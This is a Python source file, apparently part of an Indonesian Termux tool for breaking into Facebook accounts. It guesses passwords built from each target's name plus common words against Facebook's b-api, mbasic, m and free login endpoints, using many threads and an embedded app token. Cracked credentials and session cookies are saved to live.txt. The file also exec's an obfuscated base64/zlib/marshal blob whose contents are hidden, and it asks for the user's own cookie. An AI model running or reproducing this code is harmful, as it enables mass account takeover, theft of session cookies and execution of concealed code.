					print("[2] Metode mbasic (Mode Crack Lambat)")
					print("[3] Metode m.facebook (Mode Crack Lambat)")
					print("[4] Metode free.facebook (Mode Crack Lambat)")
					xhh(pwek.split(","))
					break
		elif njir in("t","T"):
			print("  -=[ Pilih Metode Crack ]=-")
			print("[1] Metode b-api (Mode Crack Cepat)")
			print("[2] Metode mbasic (Mode Crack Lambat)")
			print("[3] Metode m.facebook (Mode Crack Lambat)")
			print("[4] Metode free.facebook (Mode Crack Lambat)")
			self.ngontol()
		else:
			print("[!] Isi Yang Bener Ajg");self.askk()
	def crackapi(self,user,ox):
		global ok,cp,die,cot
		for pw in ox:
			ses=req.Session()
			api="https://b-api.facebook.com/method/auth.login"
			param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
			send=ses.get(api,params=param)
			if "session_key" in send.text and "EAAA" in send.text:
				ok+=1
				print(f"\r\x1b[1;32m * ---> {user}|{pw}\x1b[0m\n",end="")
				open("live.txt","a").write(f"{user}|{pw}\n")
				live.append(f"{user}{pw}")
				break
			elif "www.facebook.com" in send.json()["error_msg"]:
				cp+=1
				print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
				open("chek.txt","a").write(f"{user}|{pw}\n")
				chek.append(f"{user}{pw}")
				break
			else:
				continue
		cot+=1
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def modol(self,user,ox,beol,**kwargs):
		global ok,cp,die,cot
		for pw in ox:
			ses=req.Session()
			a=ses.get(f"{beol}/login/?next&ref=dbl&refid=8").text
			b=parser(a,"html.parser")
			for x in b.find_all("input"):
				if x.get("name")==None or "_fb_noscript" in x.get("name") or "sign_up" in x.get("name"):
					continue
				else:
					kwargs.update({x.get("name"):x.get("value")})
			kwargs.update({"email":user,"pass":pw})
			tol=beol+b.find("form",method="post").get("action")
			if "m.facebook.com" in beol:
				ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"x-fb-lsd":kwargs.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","origin":beol,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
			else:
				if "mbasic.facebook.com" in beol:
					anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
				else:
					anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
				ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":anjg,"origin":beol,"user-agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			ses.post(tol,data=kwargs,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki=";".join([f"{key}={value}" for key,value in ses.cookies.get_dict().items()])
				print(f"\r\x1b[1;32m * ---> {user}|{pw}|{kuki}\x1b[0m\n",end="")
				open("live.txt","a").write(f"{user}|{pw}|{kuki}\n")
				live.append(f"{user}{pw}{kuki}")
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cp+=1
				print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
				open("chek.txt","a").write(f"{user}|{pw}\n")
				chek.append(f"{user}{pw}")
				break
			else:
				continue
		cot+=1
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def ngontol(self):
		nanya=input("[?] Pilih : ")
		if nanya in[""," "]:
			print("[!] Jangan Kosong Bro");self.ngontol()
		elif nanya in["1","01"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","Bismillah","Sayang","Kontol","Bangsat","Anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","Bismillah","Sayang","Kontol","Bangsat","Anjing"]
						else:
							pewe=["Bismillah","Sayang","Kontol","Bangsat","Anjing"]
						tokai.submit(self.crackapi,xi[0],pewe)
					except:pass
			hasil(live,chek)
		elif nanya in["2","02"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","Bismillah","Sayang","Kontol","Bangsat","Anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","Bismillah","Sayang","Kontol","Bangsat","Anjing"]
						else:
							pewe=["Bismillah","Sayang","Kontol","Bangsat","Anjing"]
						tokai.submit(self.modol,xi[0],pewe,"https://mbasic.facebook.com")
					except:pass
			hasil(live,chek)
		elif nanya in["3","03"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","Bismillah","Sayang","Kontol","Bangsat","Anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","Bismillah","Sayang","Kontol","Bangsat","Anjing"]
						else:
							pewe=["Bismillah","Sayang","Kontol","Bangsat","Anjing"]
						tokai.submit(self.modol,xi[0],pewe,"https://m.facebook.com")
					except:pass
			hasil(live,chek)
		elif nanya in["4","04"]:
			print("[!] Harap Untuk Tidak Menggunakan Vpn/wifi Ketika Menggunakan Metode Ini\n[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","Bismillah","Sayang","Kontol","Bangsat","Anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","Bismillah","Sayang","Kontol","Bangsat","Anjing"]
						else:
							pewe=["Bismillah","Sayang","Kontol","Bangsat","Anjing"]
						tokai.submit(self.modol,xi[0],pewe,"https://free.facebook.com")
					except:pass
			hasil(live,chek)
		else:
			print("[!] Isi Yang Bener Ajg");self.ngontol()
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'obf.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
if __name__=="__main__":
	ftff=os.access("/sdcard",os.R_OK)
	if ftff==True:
		pass
	else:
		os.system("termux-setup-storage")
	try:
		kueh=zxss(open("cookie","r",encoding="UTF-8").read().strip())
	except FileNotFoundError:
		os.system("clear")
		print("\n[*] Cara Mendapatkan Cookie : https://youtu.be/ZT4MU7AlgA4\n[*] Ketik OPEN Untuk Membuka Video\n")
		while True:
			a=input("[?] Masukkan Cookie : ")
			if a in[""," "]:
				print("[!] Jangan Kosong")
			elif a in["open","OPEN","Open"]:
				import subprocess
				exit(subprocess.Popen(["am","start","https://youtu.be/ZT4MU7AlgA4"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
			else:
				asup(a).login()
	try:
		tentang=json.loads(open("my_info","r",encoding="UTF-8").read().strip())
	except FileNotFoundError:
		from informasi import info as aapganteng_
		aapganteng_(kueh).myinfo();restart()
	if os.path.exists("chek.txt"): pass
	else: open("chek.txt","a").close()
	if os.path.exists("live.txt"): pass
	else: open("live.txt","a").close()
	ngentod().menu()


"""
Create By Aap Afandi Ganteng
GITHUB : https://github.com/KangPacman
"""